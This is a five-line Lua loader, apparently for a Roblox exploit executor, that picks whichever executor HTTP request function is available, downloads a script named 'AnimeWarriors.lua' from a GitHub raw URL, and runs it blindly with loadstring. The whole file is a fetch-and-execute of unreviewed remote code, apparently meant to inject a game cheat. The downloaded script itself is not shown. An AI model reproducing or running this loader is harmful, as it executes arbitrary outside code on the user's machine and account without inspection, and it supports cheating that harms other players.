local exp = {}
local rq = request or syn.request or HttpRequest
exp.Url = "https://raw.githubusercontent.com/CosmicHub/HAHAEIEIUU/main/AnimeWarriors.lua"
exp.Method = "GET"
pcall(function()loadstring(rq(exp).Body)()end)